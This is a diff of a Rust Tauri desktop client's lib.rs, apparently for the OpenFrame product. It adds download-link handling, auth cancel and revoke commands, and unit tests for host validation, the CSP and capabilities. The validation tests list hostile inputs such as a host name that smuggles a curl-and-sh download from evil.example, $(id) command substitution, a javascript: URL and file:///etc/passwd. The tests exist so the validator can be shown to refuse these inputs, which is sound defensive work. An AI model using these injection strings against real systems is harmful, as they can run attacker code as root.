-        .any(|arg| handle_scheme_url(app, arg) || notifications::handle_notification_uri(app, arg))
+    args.iter().any(|arg| {
+        handle_scheme_url(app, arg)
+            || download_link::handle_url(app, arg)
+            || notifications::handle_notification_uri(app, arg)
+    })
 }
 
 /// Register [`URI_SCHEME`] for this executable (HKCU, no elevation). Re-written
@@ -1380,8 +1610,8 @@ fn build_tray(app: &tauri::App) -> tauri::Result<()> {
 pub fn run() {
     tauri::Builder::default()
         .plugin(tauri_plugin_single_instance::init(|app, argv, _cwd| {
-            // A browser handing back the OAuth callback, or a toast click,
-            // reaches the running instance on Windows as a second launch
+            // A browser handing back the OAuth callback, a toast click, or an
+            // "Open the app" link reaches the running instance on Windows as a second launch
             // carrying the URI in argv. Anything else is the user re-launching
             // the app — except a COM server launch, which only happens if this
             // instance failed to register the activator, and must not put a
@@ -1430,9 +1660,12 @@ pub fn run() {
         .manage(tokens::TokenLifecycle::default())
         .manage(updater::UpdateManager::default())
         .manage(installer::InstallerState::default())
+        .manage(download_link::DownloadLinkState::default())
         .invoke_handler(tauri::generate_handler![
             native_auth_start,
+            native_auth_cancel,
             native_auth_exchange_ticket,
+            native_auth_revoke_session,
             native_auth_get_tokens,
             native_auth_refresh_tokens,
             native_auth_set_tokens,
@@ -1444,7 +1677,8 @@ pub fn run() {
             updater::update_apply_now,
             autostart::autostart_status,
             autostart::autostart_set,
-            installer::agent_install_start
+            installer::agent_install_start,
+            download_link::take_pending_download_id
         ])
         .setup(|app| {
             build_tray(app)?;
@@ -1455,6 +1689,7 @@ pub fn run() {
             }
             tokens::spawn_wake_watch(app.handle().clone());
             tokens::spawn_refresh_loop(app.handle().clone());
+            tokens::spawn_gone_watch(app.handle().clone());
             #[cfg(target_os = "macos")]
             macos_wake::observe(app.handle().clone());
             notifications::init(app.handle());
@@ -1477,10 +1712,10 @@ pub fn run() {
             // nothing on that path, which opens no window either way.
             let asked_for_a_window = autostart::take_show_window_request(&handle);
 
-            // Cold start from a Windows protocol activation — a toast click, or
-            // an OAuth callback that arrived after the app was quit — put the
-            // URI in our own argv. Runs before the window exists so a click
-            // payload is stashed (the webview pulls it via
+            // Cold start from a Windows protocol activation (a toast click, an
+            // "Open the app" link, or an OAuth callback that arrived after the
+            // app was quit) put the URI in our own argv. Runs before the window
+            // exists so a click payload is stashed (the webview pulls it via
             // take_pending_notification_click) instead of being shown early —
             // handle_page_load still owns the reveal, so no unpainted flash.
             // `args_os`, not `args`: the latter panics on non-UTF-8 arguments.
@@ -1654,11 +1889,18 @@ pub fn run() {
             // nobody was waiting on raises nothing here — Windows is necessarily
             // laxer, since there the same URL arrives as a second process launch
             // and the single-instance handler raises for any relaunch.
+            //
+            // An "Open the app" link brings the window up as well. Not by building
+            // one: a link that started the app arrives before setup has, and
+            // setup's own open then reveals it unpainted. `show_primary_window`
+            // leaves that to setup, and builds one only where setup never will.
             #[cfg(target_os = "macos")]
             if let tauri::RunEvent::Opened { urls } = &event {
                 for url in urls {
                     if handle_scheme_url(app, url.as_str()) {
                         raise_or_open_main_window(app);
+                    } else if download_link::handle_url(app, url.as_str()) {
+                        show_primary_window(app);
                     }
                 }
             }
@@ -1673,6 +1915,271 @@ mod tests {
         url::Url::parse(url).unwrap()
     }
 
+    const SHARED: Option<&str> = Some("https://openframe.ai");
+
+    #[test]
+    fn a_tenant_of_the_shared_host_normalizes_to_its_origin() {
+        for input in [
+            "acme.openframe.ai",
+            "https://acme.openframe.ai",
+            "https://acme.openframe.ai/",
+            " https://ACME.openframe.ai ",
+        ] {
+            assert_eq!(
+                tenant_origin(input, SHARED).as_deref(),
+                Ok("https://acme.openframe.ai"),
+                "{input}"
+            );
+        }
+        // A pull-request namespace sits a level deeper in the same zone.
+        assert!(tenant_origin("https://a.pr-12.openframe.ai", SHARED).is_ok());
+        assert!(tenant_origin("https://openframe.ai", SHARED).is_ok());
+        assert!(tenant_origin("https://acme.openframe.ai:8443", SHARED).is_ok());
+    }
+
+    #[test]
+    fn the_auth_alias_of_the_shared_host_has_the_same_tenants() {
+        let shared = Some("https://auth.openframe.miami");
+        assert!(tenant_origin("https://acme.openframe.miami", shared).is_ok());
+        assert!(tenant_origin("https://acme.openframe.ai", shared).is_err());
+    }
+
+    #[test]
+    fn a_host_outside_the_zone_is_not_a_tenant() {
+        for input in [
+            "https://evil.example",
+            "https://evilopenframe.ai",
+            "https://openframe.ai.evil.example",
+            "https://acme.openframe.ai.",
+            "https://acme.openframe.build",
+            "https://127.0.0.1",
+        ] {
+            assert!(tenant_origin(input, SHARED).is_err(), "{input}");
+        }
+    }
+
+    /// The agent's install command is written from this host and runs as root.
+    #[test]
+    fn a_tenant_host_is_nothing_but_a_host_name() {
+        for input in [
+            "https://x';{curl,-o,a,evil.example};{sh,a};'.openframe.ai",
+            "https://$(id).openframe.ai",
+            "https://`id`.openframe.ai",
+            "https://a;b.openframe.ai",
+            "https://a&b.openframe.ai",
+            "https://a,b.openframe.ai",
+            "https://-flag.openframe.ai",
+            "https://.openframe.ai",
+            "https://a..openframe.ai",
+        ] {
+            assert!(tenant_origin(input, SHARED).is_err(), "{input}");
+        }
+        for input in [
+            "https://acme-1.openframe.ai",
+            "https://acme_corp.openframe.ai",
+            "https://xn--bcher-kva.openframe.ai",
+        ] {
+            assert!(tenant_origin(input, SHARED).is_ok(), "{input}");
+        }
+        let refused = tenant_origin("https://a;b.openframe.ai", SHARED).unwrap_err();
+        assert!(refused.contains("plain host name"), "{refused}");
+    }
+
+    #[test]
+    fn a_tenant_host_is_a_bare_https_origin() {
+        for input in [
+            "http://acme.openframe.ai",
+            "https://evil.example@acme.openframe.ai",
+            "https://acme.openframe.ai@evil.example",
+            "https://user:pass@acme.openframe.ai",
+            "https://acme.openframe.ai/path",
+            "https://acme.openframe.ai?x=1",
+            "https://acme.openframe.ai#x",
+            "javascript:alert(1)",
+            "",
+            "   ",
+        ] {
+            assert!(tenant_origin(input, SHARED).is_err(), "{input}");
+        }
+    }
+
+    #[test]
+    fn plain_http_is_only_for_a_gateway_on_this_box() {
+        let local = Some("http://localhost:8080");
+        assert_eq!(
+            tenant_origin("http://localhost", local).as_deref(),
+            Ok("http://localhost")
+        );
+        assert!(tenant_origin("http://127.0.0.1:8443", local).is_ok());
+        assert!(tenant_origin("http://evil.example", local).is_err());
+        assert!(tenant_origin("http://localhost", SHARED).is_err());
+    }
+
+    #[test]
+    fn no_shared_host_means_no_tenant_host() {
+        assert!(tenant_origin("https://acme.openframe.ai", None).is_err());
+    }
+
+    #[test]
+    fn a_ticket_is_only_exchanged_at_the_shared_host() {
+        let good = "https://openframe.ai/oauth/dev-exchange?ticket=abc";
+        assert!(exchange_ticket_url(good, SHARED).is_ok());
+        for bad in [
+            "https://evil.example/oauth/dev-exchange?ticket=abc",
+            "https://acme.openframe.ai/oauth/dev-exchange?ticket=abc",
+            "http://openframe.ai/oauth/dev-exchange?ticket=abc",
+            "https://openframe.ai/api/me",
+            "https://openframe.ai/oauth/dev-exchange/../me",
+            "https://x@openframe.ai/oauth/dev-exchange?ticket=abc",
+            "file:///etc/passwd",
+            "not a url",
+        ] {
+            assert!(exchange_ticket_url(bad, SHARED).is_err(), "{bad}");
+        }
+        assert!(exchange_ticket_url(good, None).is_err());
+    }
+
+    #[test]
+    fn an_exchanged_refresh_token_is_claimed_once_by_its_access_token() {
+        let state = AuthState::default();
+        let held = || NativeAuthTokens {
+            access_token: Some("access".into()),
+            refresh_token: Some("refresh".into()),
+        };
+        assert_eq!(state.claim_exchanged_refresh(Some("access")), None);
+
+        *notifications::lock(&state.exchanged) = Some(held());
+        assert_eq!(state.claim_exchanged_refresh(None), None);
+        assert_eq!(state.claim_exchanged_refresh(Some("other")), None);
+        assert_eq!(
+            state.claim_exchanged_refresh(Some("access")).as_deref(),
+            Some("refresh")
+        );
+        assert_eq!(state.claim_exchanged_refresh(Some("access")), None);
+    }
+
+    /// A command missing from the manifest is refused at runtime, with nothing at
+    /// build time to say so.
+    #[test]
+    fn every_command_is_declared_in_the_acl_manifest() {
+        let lib = include_str!("lib.rs");
+        let start = lib.find("generate_handler![").unwrap() + "generate_handler![".len();
+        let handlers = &lib[start..start + lib[start..].find(']').unwrap()];
+        let manifest = include_str!("../build.rs");
+        let mut count = 0;
+        for handler in handlers.split(',').map(str::trim).filter(|h| !h.is_empty()) {
+            let command = handler.rsplit("::").next().unwrap();
+            assert!(
+                manifest.contains(&format!("\"{command}\"")),
+                "{command} is not in build.rs"
+            );
+            count += 1;
+        }
+        assert!(count > 10, "parsed only {count} commands");
+    }
+
+    /// A hash or a nonce in a directive makes browsers ignore `'unsafe-inline'` there,
+    /// and then every inline script of the export is blocked: a blank page. So Tauri
+    /// must not touch `script-src` while it admits inline script.
+    #[test]
+    fn the_csp_keeps_its_allowlist_and_tauri_leaves_it_alone() {
+        let conf: serde_json::Value =
+            serde_json::from_str(include_str!("../tauri.conf.json")).unwrap();
+        let security = &conf["app"]["security"];
+        for csp in [&security["csp"], &security["devCsp"]] {
+            let script_src = csp["script-src"].as_str().unwrap();
+            assert!(script_src.contains("'unsafe-inline'"), "{script_src}");
+            assert!(!script_src.contains("'unsafe-eval'"), "{script_src}");
+            assert!(
+                !script_src
+                    .split_whitespace()
+                    .any(|source| source == "https:"),
+                "{script_src}"
+            );
+            for host in [
+                "https://www.googletagmanager.com",
+                "https://us-assets.i.posthog.com",
+            ] {
+                assert!(script_src.contains(host), "{script_src}");
+            }
+        }
+        let untouched = security["dangerousDisableAssetCspModification"]
+            .as_array()
+            .unwrap();
+        for directive in ["script-src", "style-src"] {
+            assert!(
+                untouched.contains(&serde_json::json!(directive)),
+                "{directive}"
+            );
+        }
+    }
+
+    /// `devCsp` is `csp` plus loopback, so a source added to one alone cannot work in
+    /// dev and be blocked in a release.
+    #[test]
+    fn the_dev_csp_differs_from_the_release_one_only_by_loopback() {
+        let conf: serde_json::Value =
+            serde_json::from_str(include_str!("../tauri.conf.json")).unwrap();
+        let (csp, dev) = (
+            conf["app"]["security"]["csp"].as_object().unwrap(),
+            conf["app"]["security"]["devCsp"].as_object().unwrap(),
+        );
+        assert_eq!(csp.len(), dev.len());
+        for (directive, sources) in csp {
+            let sources: Vec<&str> = sources.as_str().unwrap().split_whitespace().collect();
+            let dev_sources: Vec<&str> = dev[directive]
+                .as_str()
+                .unwrap()
+                .split_whitespace()
+                .collect();
+            for source in &sources {
+                assert!(dev_sources.contains(source), "{directive}: {source}");
+            }
+            for source in dev_sources.iter().filter(|s| !sources.contains(s)) {
+                let host = source
+                    .split("://")
+                    .nth(1)
+                    .and_then(|rest| rest.split(':').next());
+                assert!(host.is_some_and(is_loopback_host), "{directive}: {source}");
+            }
+        }
+    }
+
+    /// What the page can reach is the capability, not the handler list.
+    #[test]
+    fn the_capability_has_no_broad_grant() {
+        let capability: serde_json::Value =
+            serde_json::from_str(include_str!("../capabilities/main.json")).unwrap();
+        let granted: Vec<&str> = capability["permissions"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .map(|p| p.as_str().unwrap())
+            .collect();
+        for present in ["allow-agent-install-start", "allow-native-auth-get-tokens"] {
+            assert!(granted.contains(&present), "{present}");
+        }
+        for absent in [
+            "core:default",
+            "updater:default",
+            "core:event:allow-emit",
+            "allow-autostart-set",
+            "allow-autostart-status",
+        ] {
+            assert!(!granted.contains(&absent), "{absent}");
+        }
+    }
+
+    // "Open Fae" hands openframe-chat:// to the OS; any other non-web scheme
+    // stays blocked, this app's own included.
+    #[test]
+    fn only_companion_app_schemes_are_app_links() {
+        assert!(is_app_link(&parse("openframe-chat://open")));
+        assert!(!is_app_link(&parse("openframe-console://auth?devTicket=x")));
+        assert!(!is_app_link(&parse("file:///etc/passwd")));
+        assert!(!is_app_link(&parse("https://openframe.ai")));
+    }
+
     // The callback the gateway sends when it honours the requested redirect
     // (`openframe.gateway.redirect.allowed-uris`): a non-special URL still
     // parses, the host is `auth`, and the ticket is in its query.
@@ -1680,26 +2187,55 @@ mod tests {
     fn scheme_callback_is_recognised_and_carries_the_ticket() {
         let url = parse("openframe-console://auth?devTicket=abc123");
         assert!(is_auth_callback(&url));
-        assert!(url_carries_ticket(&url));
+        assert!(url_carries_outcome(&url));
     }
 
     // The gateway appends the ticket with `&` when the redirect already has a
     // query (OAuthBffController), so the parse must survive both separators.
     #[test]
     fn ticket_is_found_after_an_existing_query() {
-        assert!(url_carries_ticket(&parse(
+        assert!(url_carries_outcome(&parse(
             "openframe-console://auth?state=x&devTicket=abc123"
         )));
     }
 
-    // Ends the login as a failure rather than hanging: the gateway appends a
-    // ticket to every authMobile callback, so one without means the flow never
+    // The app's Cancel ends the waiting login with the code the frontend keeps
+    // quiet, and a second press with nothing waiting is a no-op, not an error.
+    #[test]
+    fn cancel_ends_the_waiting_login_as_user_canceled() {
+        let state = AuthState::default();
+        let (tx, mut rx) = tokio::sync::oneshot::channel();
+        *notifications::lock(&state.pending_login) = Some(tx);
+
+        assert!(cancel_pending_login(&state));
+        assert_eq!(rx.try_recv().unwrap(), Err(USER_CANCELED_ERROR.to_string()));
+        assert!(!cancel_pending_login(&state));
+    }
+
+    // An identity with no account yet, and a sign-in the user backed out of,
+    // are results the frontend acts on (its signup screen; a quiet cancel), not
+    // failures — failing them here would put a "Login Failed" toast over both.
+    #[test]
+    fn signup_and_outcome_callbacks_are_results() {
+        assert!(url_carries_outcome(&parse(
+            "openframe-console://auth?signupTicket=s-1"
+        )));
+        assert!(url_carries_outcome(&parse(
+            "openframe-console://auth?error=USER_CANCELED"
+        )));
+    }
+
+    // Ends the login as a failure rather than hanging: the gateway puts an
+    // outcome on every authMobile callback, so one without means the flow never
     // reached the BFF callback.
     #[test]
-    fn scheme_callback_without_a_ticket_is_still_a_callback() {
+    fn scheme_callback_without_an_outcome_is_still_a_callback() {
         let url = parse("openframe-console://auth");
         assert!(is_auth_callback(&url));
-        assert!(!url_carries_ticket(&url));
+        assert!(!url_carries_outcome(&url));
+        assert!(!url_carries_outcome(&parse(
+            "openframe-console://auth?state=x"
+        )));
     }
 
     // What a gateway that does not allow-list our redirect does with it: the
@@ -1755,5 +2291,44 @@ mod tests {
         assert!(!on_read_only_mount(&std::env::temp_dir()));
         assert!(!on_read_only_mount(std::path::Path::new("/Applications")));
         assert!(!on_read_only_mount(std::path::Path::new("/no/such/path")));
+    }
+
+    const BUILT_FOR: Option<&str> = Some("https://openframe.ai");
+    const CONTAINER: Option<&str> = Some("GTM-TEST");
+
+    #[test]
+    fn an_install_on_the_host_it_was_built_for_gets_the_container() {
+        assert_eq!(gtm_container(BUILT_FOR, BUILT_FOR, CONTAINER), "GTM-TEST");
+        for spelling in ["https://openframe.ai/", "HTTPS://OpenFrame.AI:443"] {
+            assert_eq!(
+                gtm_container(Some(spelling), BUILT_FOR, CONTAINER),
+                "GTM-TEST",
+                "{spelling}"
+            );
+        }
+    }
+
+    #[test]
+    fn an_install_pointed_at_another_environment_gets_no_container() {
+        for host in [
+            "https://openframe.miami",
+            "https://qa.openframe.build",
+            "https://dev.openframe.build",
+            "https://openframe.ai.example.com",
+        ] {
+            assert_eq!(
+                gtm_container(Some(host), BUILT_FOR, CONTAINER),
+                "",
+                "{host}"
+            );
+        }
+    }
+
+    #[test]
+    fn a_build_without_a_container_or_a_host_injects_nothing() {
+        assert_eq!(gtm_container(BUILT_FOR, BUILT_FOR, None), "");
+        assert_eq!(gtm_container(BUILT_FOR, BUILT_FOR, Some("")), "");
+        assert_eq!(gtm_container(BUILT_FOR, None, CONTAINER), "");
+        assert_eq!(gtm_container(None, BUILT_FOR, CONTAINER), "");
     }
 }
